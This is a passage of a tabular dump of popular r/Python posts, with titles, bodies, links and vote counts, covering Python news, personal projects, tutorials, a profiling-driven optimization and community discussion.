        def __radd__(self: T, other: Any, /) -> T:
            ...

    class RAddable(Protocol):
        def __radd__(self: ""RAddable"", other: Any, /) -> Any:
            ...

    SA = TypeVar(""SA"", bound=SameAddable)
    RA = TypeVar(""RA"", bound=SameRAddable)


    @overload
    def slow_add(a: SA, b: SA) -> SA:
        ...

    @overload
    def slow_add(a: Addable, b: Any) -> Any:
        ...

    @overload
    def slow_add(a: Any, b: RA) -> RA:
        ...

    @overload
    def slow_add(a: Any, b: RAddable) -> Any:
        ...

    def slow_add(a: Any, b: Any) -> Any:
        time.sleep(0.1)
        return a + b",https://www.reddit.com/r/Python/comments/10zdidm/why_type_hinting_sucks/,297,941
q5cnnk,"Guido van Rossum ""honored"" as Python becomes #1 most popular programming language on TIOBE ranking, passing C and Java",,https://developers.slashdot.org/story/21/10/09/0029238/beating-c-and-java-python-becomes-the-1-most-popular-programming-language-says-tiobe,44,938
lkca8k,Ladies and gentlemen - switch cases are coming!,,https://github.com/gvanrossum/patma/blob/master/README.md#tutorial,291,933
spxim1,Notebooks suck: change my mind,"Just switched roles from ml engineer at a company that doesn’t use notebooks to a company that uses them heavily. I don’t get it. They’re hard to version, hard to distribute, hard to re-use, hard to test, hard to review. I dont see a single benefit that you don’t get with plain python files with 0 effort.


ThEyRe InTErAcTiVe…

So is running scripts in your console. If you really want to go line-by-line use a repl or debugger.

Someone, please, please tell me what I’m missing, because I feel like we’re making a huge mistake as an industry by pushing this technology.

edit: Typo

Edit: So it seems the arguments for notebooks fall  in a few categories. The first category is “notebooks are a personal tool, essentially a REPL with a diffferent interface”. If this was true I wouldn’t care if my colleagues used them, just as I don’t care what editor they use. The problem is it’s not true. If I ask someone to share their code with me, nobody in their right mind would send me their ipython history. But people share notebooks with me all the time. So clearly notebooks are not just used as a REPL.

The second argument is that notebooks are good for exploratory work. Fair enough, I much prefer ipython for this, but to each their own. The problem is that the way people use notebooks in practice is to write end to end modeling code that needs to be tested and rerun on new data continuously. This is production code, not exploratory or prototype code. Most major cloud providers encourage this workflow by providing development and pipeline services centered around notebooks (I’m looking at you AWS, GCP and Databricks).

Finally, many people think that notebooks are great for communicating or reporting ideas. Fair enough I can appreciate that use case. Bus as we’ve already established, they are used for so much more.",https://www.reddit.com/r/Python/comments/spxim1/notebooks_suck_change_my_mind/,345,933
89b73q,"Aiming to fill skill gaps in AI, Microsoft makes training courses available to the public","Hi guys.
I came across this in r/technews and thought it would be useful here; particularly if you are looking at using python for data analysis/machine learning etc.

>This computer science course provides an overview of AI, and explains how it can be used to build smart apps that help organizations be more efficient and enrich people’s lives. It uses a mix of engaging lectures and hands-on activities to help you take your first steps in the exciting field of AI.

[Link to Microsoft Blog](https://blogs.microsoft.com/ai/microsoft-professional-program-ai/?utm_source=reddit&utm_campaign=75010&utm_term=technews)

[Link to Microsoft course](https://academy.microsoft.com/en-us/professional-program/tracks/artificial-intelligence/)",https://www.reddit.com/r/Python/comments/89b73q/aiming_to_fill_skill_gaps_in_ai_microsoft_makes/,46,938
j6n6wt,Six more quick ways to improve your Python,,https://sourcery.ai/blog/explaining-refactorings-4/,166,932
l6dqvx,"Quickly fetch your WiFi password and if needed, generate a QR code of your WiFi to allow phones to easily connect. Works on macOS and Linux and Windows","&#x200B;

https://i.redd.it/nv8qimciqxd61.gif

Hey!

I just wanted to share a neat little tool I made earlier this week. It allows you to get your WiFi password and if you want, you can generate a QR code so that your friends can scan the QR code to quickly connect to your WiFi.

GitHub: [https://github.com/sdushantha/wifi-password](https://github.com/sdushantha/wifi-password)

Let me know what you guys think about it :)",https://www.reddit.com/r/Python/comments/l6dqvx/quickly_fetch_your_wifi_password_and_if_needed/,39,929
jpt7s7,"Play detective on Reddit: Discover political trolls, secret influencers and more",,https://i.redd.it/hziik0yzbux51.png,46,931
nklez0,"Why Python 4.0 might never arrive, according to its creator",,https://www.tectalk.co/why-python-4-0-might-never-arrive-according-to-its-creator/,263,927
6hgsqr,Instagram Makes a Smooth Move to Python 3 - The New Stack,,https://thenewstack.io/instagram-makes-smooth-move-python-3/,120,930
gigyew,Particle physics in Pygame with a view and a basic GUI (menu and plots),,https://i.redd.it/ekaceopgldy41.gif,33,931
a1rgaq,"I'm no data scientist, can somebody explain the correlation to me?",,https://i.redd.it/pm1qhokf8g121.png,128,925
kyb9rc,RepostSleuthBot - Now Public,"I've been working on this project for the last 2 years. It has gotten super popular and I've had a ton of requests to open the code up.  I was always resistant since I considered it kind of a mess.  I decided to take some time to clean it up a bit and make the repo public.

It has a lot going on, but nothing very complicated.

It makes heavy use of Celery for scheduling jobs and runs \~20 Docker containers for the various services.

It's not something you would easily be able to deploy on your own, however, I figured some people might be interested in seeing the workings.

[https://github.com/barrycarey/RedditRepostSleuth](https://github.com/barrycarey/RedditRepostSleuth)",https://www.reddit.com/r/Python/comments/kyb9rc/repostsleuthbot_now_public/,73,920
4hazs4,How I built an entire game and toolchain 100% in Python using PyGame,"Hey everyone, I'm a C/C++ programmer who recently discovered Python.  My friend told me about PyGame, and I decided to try to write an entire game in it.  I want to tell you the order I did things in, as I think you might find it interesting, and maybe try it yourself some time!

**Background:**

Epikos is an RPG I'd been wanting to make for years, but never really had the time to make.  Python, however, writes really expressive code and can really accelerate dev time.  I feel like I can write code 50X faster in Python than in C++.

Since I have a day job, this had to be a project which I could do after work.  Entire thing took about two years, including making all the assets for the game and all the tools.  Workload was about 2 hours after work each day, and a lot more time on the weekends.

**Step 1:  Making the tools for the game**

For reference, game screenshots can be seen here:

http://www.epikosrpg.com/screenshots/

**The Console:**

First, I made what I call a ""console.""  It's a bit like a DOS or Linux shell.  I wanted this so I could type commands into my game and the toolset used to create the game.  It doesn't look like much, but here is an example of what the console looks like:

http://imgur.com/mMutYwL

**The Paint Program:**

Next, the game needed a program to create sprite art in.  I could have used photoshop, aesprite, or any number of paint programs, but I wanted to make my own custom sprite animation tool, and I wanted it in Python.  I had barely done any python coding at this point, but even then the paint tool took only a couple of days to write.  It's called tilemake, and it looks like this:

http://imgur.com/Qw4BMMc

As you can see, this paint tool uses the console, which I had built first.  In the above example, I have loaded the ""knight"" sprite, which is used for one of the main characters in the game.  The tool shows you multiple zoomed in versions of the sprite (""mips"") and you can paint on any one of them, using the CGA color palette.  You can also animate the sprites in this very tool.

I got a lot of milage out of this tool, as the game has 826 sprite frames in it, all made with this very paint program.

**The Map Editor:**

Now, my game needed 2D maps.  Since I had some art made with the paint program, it was time to arrange this art in the form of a map.  The map editor looks like this:

http://imgur.com/qLA9vYk

There are several components to this editor, but keep in mind I'm sticking 100% to Python.  In the main view, you can zoom and scroll about with the mouse, and paint using several different sized brushes.

You can see a column to the right which says ""natural"".  This shows all the sprites which are used in a natural environment.  There are other categories, such as indoors, dungeon, etc.  Categories were important, since I have many, many different sprites.

Finally, on the bottom you can see our old friend, the console.

**Step 2:  The Game Itself:**

Once you have the map editor, making a game isn't really that different, it just has gameplay logic.  Most of it is really simple, this includes combat logic, movement, etc.  I'm not going to go into the details of these since writing them in Python should be fairly trivial, but ask me if you want something explained in greater detail.  I will, however, go over some highlights and gotchas:

**AStar (A*):**

A* is a common AI algorithm used for pathing.  Implementing it in Python is pretty easy.  Python reads a lot like pseudocode, and A* can be found on wikipedia:

https://en.wikipedia.org/wiki/A*_search_algorithm

That code isn't really very different from Python is it?  As an excercise, you can try pasting that into Python and see what you need to change.  Hint:  not much.  Shouldn't take you more than half an hour to get some good AI pathing going.

**Save/Load with Pickle:**

I *love* pickle, and used it for save/loading.  It's a standard Python module, so if you haven't used it yet you should check it out.  One gotcha was that saveing and loading maps was too expensive in pickle, so I compressed the maps first with basic dictionary encoding, and then used pickle on them.

When writing save/load, make sure to include version filtering or some mechanism so that if you change file formats later on, older files are automatically updated.  You don't want your players to lose progress just because you patched and changed savegame format!

**Font?:**

There are several legal issues surrounding the use of fonts on a cross-platform title, and I really didn't want to bother with that.  I couldn't find a good free font which matched my art style, so I created my own font for my game.  If you can do this, I recommend it, because then you own it and can use it forever.

**Music:**

One thing I didn't write from scratch was the music authoring software.  Audio isn't really my expertise, but I wanted NES sounding music.  I ended up using this:

http://famitracker.com/

Famitracker is a fun way to write NES-sounding music, and indeed it actually writes to the nes file format.  Of course, PyGame can't play this, so I converted it to .ogg format.  Why .ogg?  I found that other supported formats tended to crash pygame, so I recommend that one.

**Sound FX:**

Similarly, I wanted an old-school feeling for my sound FX.  Authoring these in famitracker didn't seem that efficient, but someone showed me a tool called bfxr:

http://www.bfxr.net/

This let me create all kinds of sounds for my game.  For more complicated sounds, I needed to fallback to famitracker, but 90% of the sounds were in bfxr.

**Shipping the Game:**

I couldn't ship raw .py files, so I used pyinstaller to turn my game into a single .exe file.  I had tried python2exe, but couldn't get it to work very well with pygame.  Maybe you can have better luck with python2exe, but I'd recommend pyinstaller.  PyInstaller uses another library called setupTools.  For some reason, my .exe wouldn't work with the latest version of setupTools (gave an error and immediately quit), so I had to do this:

pip install setuptools==19.2

That gives you the older version, which should work.

The last part of shipping is making the .exe and game assets into an installer.  For this I used something called NSIS.  Sadly, I can't recommend you use this at this point, since it was on Sourceforge and if you go there now you'll probably get viruses and malware (RIP Sourceforge).  If you happen to have an older version of NSIS, I recommend backing it up on your google drive, since re-downloading it is not an option.

**Conclusion:**

While there were some gotchas, I didn't have too much trouble making a small-scale game 100% in Python, and it was a suitable project to do after work, even while working a full-time job.  

Happy coding!

**Edit:**

Thank you for the Reddit gold.  This has inspired me to share some other misc info with you now:

*  One huge advantage of Python is that porting from Windows to Linux only took an afternoon.  I did it all on virtualbox running Mint.  In fact, setting up virtualbox to run Mint was harder than porting the game.  There were two gotchas.  First, if you're using time.clock() on windows, make sure to change it to time.time() on Linux.  Second, some of the backslashes in filenames needed to be changed to forward slashes.  That's it!!!

*  If you are on Windows, I recommend trying the Python plug-in for Visual Studio.  I didn't actually use it while developing my game, but I think it would have helped from time to time.  It gives breakpoints, variable watch, and callstack info.



",https://www.reddit.com/r/Python/comments/4hazs4/how_i_built_an_entire_game_and_toolchain_100_in/,135,923
bh90iy,I made a Desktop Application to displays the bond-line structure of any chemical compound/molecule.(inspired by u/hvrc23 's work),,https://i.redd.it/tdj6vud43fu21.jpg,119,924
lngfnw,I never knew events were THIS powerful - A Python observer pattern tutorial,,https://youtu.be/oNalXg67XEE,56,916
5jwf41,Python 3.6.0 has now been officially released!,,http://blog.python.org/2016/12/python-360-is-now-available.html,94,917
11hwppa,I built a chatbot that debugs your Python code better than ChatGPT,"Link: [https://useadrenaline.com/](https://useadrenaline.com/)

[Demo video](https://reddit.com/link/11hwppa/video/6b6rkdexepla1/player)

I built this using semantic search and the ChatGPT API, which was just released the other day. What makes it special is it not only understands the code you're debugging, but also pulls in additional context like relevant documentation to help answer your questions and suggest code changes. Ultimately, my goal is to take the hassle out of pasting error messages into Google, finding a vaguely related StackOverflow post, and manually integrating the solution into your code.

Please let me know what y'all think!",https://www.reddit.com/r/Python/comments/11hwppa/i_built_a_chatbot_that_debugs_your_python_code/,122,918
nqcdj6,Python is too nice,"I'm a self taught programmer for about 2 years now. I started off by learning python then went on to learn javascript, java, kotlin, and now go. Whenever I tried to learn these languages or new languages I always was thinking 'I could do this much easier in python.\` Python is just so nice to work with that it makes me not want to use anything else. And with no need to use anything else that means there is no drive to learn anything else. 

Most recently while I was trying to learn go I attempted to make a caeser cipher encoder/decoder. I went about this by using a slice containing the alphabet and then collecting a step. My plan was then to find the index of a letter in the code string in the slice then shift that index accordingly. In python I would simply just use `.index`. But after some research and asking questions I found that go doesn't support generics (currently) and in order to replicate this functionality I would have to use a binary sort on a sorted slice.

Python also does small quality of life things that just come with it being dynamically typed. Like when initializing variables in for loops there is no `i = 0;` etc. On top of all that there is also pip. It is so nice to just `pip install [x]` instead of having to download file then pointing to an executable. Python and pip also allows for pythons to be used for so much. Want to do some web dev? Try django or flask. Interested in AI? How about pytorch.

I guess I'm just trying to say that python is so nice to use as a developer that it makes me not want to use anything else. I'm also really looking for advice on how to over come this, besides just double down and do it. 

(This post is not at all an insult to python. In fact its a tribute to how much I love python)",https://www.reddit.com/r/Python/comments/nqcdj6/python_is_too_nice/,298,920
gdzqwf,I made a YouTube video/playlist to MP3 converter with the ability to suggest and edit MP3 annotations,,https://v.redd.it/5dt4dzu7syw41,67,919
f79r89,"When I was learning machine learning for the first time, the exact manner in which convolutional neural networks worked always evaded me, largely because they were only ever explained at an introductory level in tutorials. So, I made an animated video explaining exactly how CNNs work. Hope it helps!",,https://www.youtube.com/watch?v=eyKwPyOqMg4,43,919
mehpp4,"A free HTML version of my book ""Python from the Very Beginning""","Last year, when my Python book was new, I posted here offering a free PDF copy of the book to anyone who could not afford it. A little over 200 free copies were given away. However, it involved contacting me by email, which probably limited take up, and meant I had to deal with lots of emails!

Sales are now good enough, both on Amazon and direct, that I think I can afford to give the book away freely more directly.

So, I used the wonderful [Pandoc](https://pandoc.org) (and some manual fiddling) to build an HTML version of the book from the LaTeX source with all images embedded (I had no idea you could do that in HTML!). So you can download it as a single file as well as view it on the web.

You can get it by clicking on ""Free HTML version"" on the book's website:

[https://pythonfromtheverybeginning.com/](https://pythonfromtheverybeginning.com/)

(PDF/ePub/Kindle/Paperback still available.)",https://www.reddit.com/r/Python/comments/mehpp4/a_free_html_version_of_my_book_python_from_the/,45,916
fwgtu6,I made a command-line tool to find similar sounding audio files,,https://v.redd.it/wk1mwhxtvcr41,96,907
fijxgq,I made a bot for a sudoku game,,https://v.redd.it/hxq9evwvnnm41,45,904
12xrvwz,Is it just me or are the docs for sqlalchemy a f*cking nightmare?,"Granted, I have little to no experience when it comes to working with databases, but the docs for sqlalchemy are so god damn convoluted and the lingo is way too abstract. Perhaps someone can recommend a good in-depth tutorial?",https://www.reddit.com/r/Python/comments/12xrvwz/is_it_just_me_or_are_the_docs_for_sqlalchemy_a/,175,909
oz5erv,I created an Excel Add-in to generate Pandas Dataframes right inside Excel,"I am working as a Data Analyst. In many cases, the Excel Files I am dealing with are pretty 'messy'. Often the Excel files are containing headers, comments, additional (unnecessary or blank) columns.

If I want to perform analysis using the pandas library, first I need to transform the Excel file into a pandas DataFrame using 'pandas.read\_excel(""ExcelFile.xlsx"")'. Pandas offers different parameters to read in 'messy' Excel files, such as *usecols*, *skiprows*, *nrows*, etc.

Yet, I found it tedious always to specify those arguments if I just want to perform a quick analysis. That is why I have created an Excel Add-In, which does all the tiresome work. As shown in the gif below, after I select the data I want to transform into a pandas dataframe, the add-in will create a python file in the workbook's directory. The VBA code will translate the cell range into the necessary pandas arguments:

* io *\[File Name\]*
* sheet\_name
* skiprows *\[Number of lines to skip (int) at the start of the file\]*
* usecols *\[Excel column letters and column ranges (e.g. “A:E”)\]*
* nrows *\[Number of rows to parse\]*

[Demo of 'Create Pandas Dataframe' Button](https://i.redd.it/1aclg7d4aqf71.gif)

Perhaps this add-in might be also helpful to you. I also added some other neat features into the add-in to expand excel capabilities. With the add-in, you can add images to Excel comments, transform text to checkboxes, easily create Drop Down lists with one click, remove empty & blank spaces from cells, and much more.

Here is the link to the tutorial:

*(The Python-specific part starts at 8:40 min)*

[https://youtu.be/PmJ9rkKGqrI](https://youtu.be/PmJ9rkKGqrI)

You can download the add-in for free here.

[https://pythonandvba.com/mytoolbelt](https://pythonandvba.com/mytoolbelt)

It would be great if you could share your feedback with me. Any suggestions regarding additional features or improvements? Please let me know :) **Enjoy!**",https://www.reddit.com/r/Python/comments/oz5erv/i_created_an_excel_addin_to_generate_pandas/,48,905
iz0agr,Python and FastAI to Qualify at Fall Guys,,https://youtu.be/GS_0ZKzrvk0,55,909
bwlo4g,I made an augmented reality real time sudoku solver in Python (source code in comments),,https://www.youtube.com/watch?v=H4L9yENEQbI#youtube,74,904
uqqseh,Sorting lists in python: sorted() vs sort(),"&#x200B;

https://preview.redd.it/e1uliikapsz81.png?width=2162&format=png&auto=webp&s=727956e0190454a170258cd98526d448004df74f

Code: [https://www.30secondsofcode.org/articles/s/python-sortedlist-vs-list-sort](https://www.30secondsofcode.org/articles/s/python-sortedlist-vs-list-sort)",https://www.reddit.com/r/Python/comments/uqqseh/sorting_lists_in_python_sorted_vs_sort/,33,900
ijdmca,I made a terminal-based presentation tool with colors and effects!,"Hey everyone, I made `present` which is a terminal-based presentation tool with some extra goodies! You can write slides using Markdown (I also plan to add Jupyter notebook support) and also play codios (pre-recorded playable code blocks) which can be useful for live demos! Here's the [code on Github](https://github.com/vinayak-mehta/present). And here's a demo:

&#x200B;

https://i.redd.it/ei6flui6i5k51.gif",https://www.reddit.com/r/Python/comments/ijdmca/i_made_a_terminalbased_presentation_tool_with/,79,903
7v0q88,I've created a debugger which lets you conveniently view the value of every expression,,https://imgur.com/gallery/48HqX,111,901
j90xlr,5 Hidden Python Features You Probably Never Heard Of,,https://miguendes.me/5-hidden-python-features-you-probably-never-heard-of-ckg3iyde202nsdcs1ffom9bxv,97,895
csnz32,So excited. Left work early to pick it up.,,https://imgur.com/boyrPkw,160,896
gco5v6,A* Pathfinding on Ipad,,https://v.redd.it/3kyrshiwxiw41,47,897
f3tdu2,Making a game with pygame library,,https://v.redd.it/zpgbqzojmwg41,30,895
5jf64k,Top 10 Python libraries of 2016,,https://tryolabs.com/blog/2016/12/20/top-10-python-libraries-of-2016/,64,897
pzylot,Why does it feel like everyone is trying to play code golf??,"If you didn't know, code golf is a game/challenge to solve a problem in the least number of keystrokes. 

That's fine and all, but it feels like everyone is doing that outside of code golf as well. When I read people's python code either on Github or LeetCode discussion section, people all seem to want to write the least number of lines and characters, but why???

Like why write \`l,r\` when you can do \`left, right\`?

 Or why assign a variable, compare something, and return a value all in the same line, when you can put them each in their own lines and make the code more readable? 

I just feel like 'cleaver' code is never better than clear, readable code. Isn't python meant to read like English anyways?",https://www.reddit.com/r/Python/comments/pzylot/why_does_it_feel_like_everyone_is_trying_to_play/,271,901
ljghmz,So I Accidentally Made a (Harmless) Virus...,"I was messing around with python (specifically pynput) and got bored, and thought ""wouldn't it be cool if I made a virus?"" Now, when I thought this, I was doing purely for shits and giggles, and I had/have no harmful intent.

So the virus consists of a basic forever loop, which just takes control of your mouse, and prevents you from moving. Really basic, I know. So I run the file, and to my surprise is works! Except I didn't implement a fail safe, so nothing would work to stop the program. I obviously couldn't use task manager, and Alt + F4 didn't work. So I ended up just turning off my PC lmao. I wanting to see if my computer would detect it as a virus, and it sure did. It didn't delete it, but it did warn me, which is reassuring but also funny.

 But yeah I didn't send the code to anyone or anything, just a harmless thing that took me less than 5 minutes.",https://www.reddit.com/r/Python/comments/ljghmz/so_i_accidentally_made_a_harmless_virus/,139,897
lf59bw,Machine Learning Library by 14-year old : SeaLion,"Recently as a 14-year old in high school I've created a machine learning library, [SeaLion](https://pypi.org/project/sealion/), from scratch. It  took around 3 months of programming, and is 5k+ lines and uses Python and Cython. The library is also very well maintained (just had my first issue yesterday - thanks u/ForceBru!)

You can install this library with pip. It's on PyPI : [https://pypi.org/project/sealion/](https://pypi.org/project/sealion/) and GitHub : [SeaLion Repo](https://github.com/anish-lakkapragada/SeaLion)

A problem I saw with the current ml libraries and tutorials was that they didn't go over too much into the theory of these libraries - more so on just the syntax and calling the functions. In the summer of 2020 I could easily build a CNN or RNN in tensorflow, but I didn't understand it - hence I decided to start learning from scratch. It has been quite a ride and I needed a lot of help along the way to help me understand the math (I've never taken a calculus class) but it has been tremendously useful in helping me understand every aspect of ML from the code, theory, and the speed.

**SeaLion is an extremely comprehensive library that spans from basic Linear Regression up to modern approaches like deep neural networks. It mostly deals with regression, unsupervised clustering, bayesian models, dimensionality reduction, neural networks, etc. If you've never heard some of those algorithms before (or just are a complete beginner to ML), you are in the right place!! SeaLion has plenty of code examples to help guide you through each step of the way!**

The examples go over not just how sealion's code can be called but the intuition on how they work. They compare and contrast the benefits and cons of KMeans vs. DBSCAN or PCA vs. tSNE and go over each function in a easy-to-understand way. SeaLion is extremely easy to use, and the API function names and classes are similar to those of other ml libraries to make it easier for those experienced to grasp the syntax. Of course none of the actual source code uses any ml frameworks.

You can find the code examples here : [SeaLion Repo](https://github.com/anish-lakkapragada/SeaLion)

If you would like to install, please make sure you are on version 4.0.1 and have Python 3.

I think you'll greatly enjoy SeaLion, especially if you are just getting started. Please give the repo a star! And to all my other coders, regardless of your age : keep pushing!!

**EDIT : thank you all so much for your appreciation and comments!** I put this in the evening and just got one comment for a few hours and I thought it was done -  so I barely even remembered about it in the morning. It's so nice to start a Monday with comments and support from so many people.

SeaLion was built for fun and I'm super surprised that it got this big! I only put it on GitHub to share code with some friends, but this is great! This is only possible due to people who make stack overflow posts, reddit posts (thank you!), YouTube videos, etc. that make everything extremely clear. The internet is a great resource.",https://www.reddit.com/r/Python/comments/lf59bw/machine_learning_library_by_14year_old_sealion/,186,895
10d6ugv,NiceGUI: Let any browser be the frontend for your Python code,"We are thrilled to share that [NiceGUI](https://nicegui.io/), our open-source library for building web-based user interfaces, continues to thrive. With NiceGUI, you can focus on writing Python code while the web development details are handled behind the scenes. This makes it ideal for a wide range of projects including short scripts, dashboards, robotics projects, IoT solutions, smart home automation, and machine learning.

Of course there are valid use cases for splitting frontend and backend technologies. NiceGUI is for those who don’t want to leave the Python ecosystem and like to reap the benefits of having all code in one place. There are other options like [Streamlit](https://streamlit.io/), [Dash](https://plotly.com/dash/), [Anvil](https://anvil.works/), [JustPy](https://justpy.io/), and [Pynecone](https://pynecone.io/). But we initially created NiceGUI to easily handle the state of external hardware like LEDs, motors, and cameras. Additionally, we wanted to offer a gentle learning curve while still providing the ability to go all the way down to HTML, CSS, and JavaScript if needed.

NiceGUI runs on top of [FastAPI](https://fastapi.tiangolo.com/) which allows you to add authentication, routing, OpenAPI specs, and other backend functionality to your projects. The frontend is implemented using [Vue](https://vuejs.org/), [Quasar](https://quasar.dev/), and [Tailwind](https://tailwindcss.com/), but you don’t need to be familiar with these technologies to create beautiful user interfaces. NiceGUI prioritizes simplicity and user-friendliness, while still offering the option for advanced customization through its extensibility.

We welcome contributions and are excited to see what you build with NiceGUI. If you have any questions or want to share your projects, please don't hesitate to reach out. We look forward to growing the [NiceGUI community](https://github.com/zauberzeug/nicegui) with your help!

&#x200B;

[showcasing what you can do with NiceGUI](https://reddit.com/link/10d6ugv/video/h812bxhvhcca1/player)",https://www.reddit.com/r/Python/comments/10d6ugv/nicegui_let_any_browser_be_the_frontend_for_your/,158,895
k8g0py,Black Hat Python 2nd Edition,"The Second Edition of Black Hat Python is available for early ordering (to be published in print in March 2021), and free PDF chapter is available here: [https://nostarch.com/black-hat-python2E](https://nostarch.com/black-hat-python2E) Revamped and updated to Python 3.

The free chapter is about creating a network sniffer with Python.

Disclosure, I'm one of the authors.",https://www.reddit.com/r/Python/comments/k8g0py/black_hat_python_2nd_edition/,55,895
fvvuej,I made a simple translator with an interface using kivy,,https://v.redd.it/12nknkf946r41,80,902
ww84sv,"I was unhappy with Spotify recommendations, so I used Python+Spotify's API to make more than 1,000. See the bottom from a Streamlit app to find your playlist.",,https://www.datafantic.com/what-songs-were-popular-when-i-was-in-high-school/,42,896
ckpk72,Had open-sourced a small script I wrote and mostly forgot about it. But then this happened and made my day!!!,,https://i.redd.it/vy83cl7grud31.png,34,892
s1oqb7,That time I optimized a Python program by 5000x,"*TL;DR I used our Scalene profiler (pip install scalene) and some math to make an example program run 5000x faster.*

I am quite interested in Python performance so naturally I read this article — [https://martinheinz.dev/blog/64](https://martinheinz.dev/blog/64), whose title is *Profiling and Analyzing Performance of Python Programs.* It presents an example program from the Python documentation ([https://docs.python.org/3/library/decimal.html](https://docs.python.org/3/library/decimal.html)) and shows how to run it with several time-worn Python profilers. Unfortunately, it doesn’t come away with much actionable information, beyond, more or less, “try [*PyPy*](https://www.pypy.org/)””, which speeds up the code by about 2x. I wondered if I would be able to get more useful information from Scalene, a profiler I co-wrote.

[Scalene: https:\/\/github.com\/plasma-umass\/scalene\/, pip install scalene](https://preview.redd.it/cg4u621qp4b81.png?width=1000&format=png&auto=webp&s=b9aaf92125523801c12bbef4fc1f649cc499da3e)

We developed Scalene to be a lot more useful than existing Python profilers: it provides line-level information, splits out Python from native time, profiles memory usage, GPU, and even copying costs, all at a line granularity.

Anyway, here’s the result of running Scalene (just with CPU profiling) on the example code. It really cuts to the chase.

    % scalene --cpu-only --reduced-profile test/test-martinheinz.py

https://preview.redd.it/j1yhxptvp4b81.png?width=1400&format=png&auto=webp&s=3bc8d25415fc8ac25a8f7da3031299a724fa02cf

You can see that practically all the execution time is spent computing the ratio between num and fact, so really this is the only place to focus any optimization efforts. The fact that there is a lot of time spent running native code means that this line is executing some C library under the covers.

It turns out that it is dividing two `Decimal`s (a.k.a. [bignums](https://en.wikipedia.org/wiki/Arbitrary-precision_arithmetic)). The underlying bignum library is written in C code and is pretty fast, but the factorial in particular is getting really large really fast. In one of the example inputs, the final value of `fact` is 11,000 digits long! No surprise: doing math on such huge numbers is expensive. Let’s see what we can do to make those numbers smaller.

I observe that we can compute `num / fact` not from scratch but incrementally: update a variable on each loop iteration via a computation on drastically smaller numbers. To do this, I add a new variable `nf` which will always equal the ratio `num / fact`. Then, on each loop iteration, the program updates `nf` by multiplying it by `x / i.` You can verify this maintains the invariant `nf == num/fact` by observing the following (where `_new` means the computation of the updated variable in each iteration).

    nf == num / fact                  # true by induction
    nf_new == nf * (x / i)            # we multiply by x/i each time
    nf_new == (num / fact) * (x / i)  # definition of nf
    nf_new == (num * x) / (fact * i)  # re-arranging
    nf_new == num_new / fact_new      # simplifying

Incorporating this into the original program required changing three lines of code, all of which are followed by ###:

    def exp_opt(x):
      getcontext().prec += 2
      i, lasts, s, fact, num = 0, 0, 1, 1, 1
      nf = Decimal(1)   ### was: = num / fact
      while s != lasts:
          lasts = s
          i += 1
          fact *= i
          num *= x
          nf *= (x / i) ### update nf to be num / fact
          s += nf       ### was: s += num / fact
      getcontext().prec -= 2
      return +s

The result of this change is, uh, *dramatic*.

On an Apple Mini M1, original version:

    Original:
    1.39370958066637969731834193711E+65
    5.22146968976414395058876300668E+173
    7.64620098905470488931072765993E+1302
    Elapsed time, original (s):   33.231053829193115

The optimized version:

    Optimized:
    1.39370958066637969731834193706E+65
    5.22146968976414395058876300659E+173
    7.64620098905470488931072766048E+1302
    Elapsed time, optimized (s):  0.006501913070678711

More than a *5000X* speedup (5096, to be precise).

The moral of the story is that using a more detailed profiler like Scalene can really help optimization efforts by locating inefficiencies in an actionable way.",https://www.reddit.com/r/Python/comments/s1oqb7/that_time_i_optimized_a_python_program_by_5000x/,68,889
a9o110,Comprehensive Python Cheatsheet,,https://gto76.github.io/python-cheatsheet,50,891
9mftca,Neat 'Python cheat sheet for Data Science' for beginners.,,https://i.redd.it/ahetz5jtbzq11.jpg,43,885
qbhrqh,Python converts assignment writeups into my handwriting !!!,"&#x200B;

https://preview.redd.it/i2bps5fkagu71.png?width=1566&format=png&auto=webp&s=e5578048fd5fa58bbbb26922d7c6ca80d3b09da5

&#x200B;

 Do you ever get irritated by pointless college/school assignments? Hell yeah!!!  

Don’t worry, I’ve got you covered. This python script will transform your digital text (writeups or assignment) into handwriting.

PS: Its just a 25 line code:)

github = [https://github.com/Pranav082001/Text-to-Handwriting](https://github.com/Pranav082001/Text-to-Handwriting)

medium= [https://medium.com/@pranav.kushare2001/convert-text-into-your-handwriting-91a1ed9aefd0](https://medium.com/@pranav.kushare2001/convert-text-into-your-handwriting-91a1ed9aefd0)",https://www.reddit.com/r/Python/comments/qbhrqh/python_converts_assignment_writeups_into_my/,114,888
hjgvcz,"""Automate the Boring Stuff with Python"" online course is free to sign up for the next few days with code JUL2020FREE","https://inventwithpython.com/automateudemy (This link will automatically redirect you to the latest discount code.)

You can also click this link or manually enter the code: JUL2020FREE (on Saturday the code changes to JUL2020FREE2)

https://www.udemy.com/course/automate/?couponCode=JUL2020FREE

This promo code works until July 4th (I can't extend it past that). Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later.

Udemy has changed their coupon policies, and I'm now only allowed to make 3 coupon codes each month with several restrictions. Hence why each code only lasts 3 days. **I won't be able to make codes after this period**, but I will be making free codes next month. [Meanwhile, the first 15 of the course's 50 videos are free on YouTube.](https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW)

You can also purchase the course at a discount using my code JUL2020 (or whatever month/year it is) or clicking https://inventwithpython.com/automateudemy to redirect to the latest discount code. I have to manually renew this each month (until I get that automation script done). And the cheapest I can offer the course is about $14 to $16. (Meanwhile, this lets Udemy undercut my discount by offering it for $12, which means I don't get the credit for referral signups. Blerg.)

**Frequently Asked Questions:** (*read this before posting questions*)

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is now available online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. Expect that update to happen in mid- or late-2020. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be ""good at math"" to be good at coding.**
